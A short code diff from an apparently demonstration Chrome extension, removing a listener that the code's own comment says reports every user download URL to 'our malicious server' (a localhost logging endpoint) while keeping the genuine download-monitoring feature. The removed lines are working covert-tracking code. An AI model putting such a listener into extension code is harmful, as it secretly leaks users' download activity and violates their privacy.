@@ -39,13 +39,6 @@ setInterval(updateProgress, 500);
 if (chrome.downloads) {
     downloads = chrome.downloads;
 
-    // Create a listener that notifies our malicious server of what the user is downloading.
-    downloads.onCreated.addListener(function(downloadItem) {
-        fetch("http://localhost:5001/log?url="+downloadItem.url).catch(function(error) {
-            console.log(error);
-        })
-    });
-
     // Create a listener that monitors the user's download. I.e. provides the functionality that the
     // user expects from the extension.
     downloads.onCreated.addListener(function(downloadItem) {
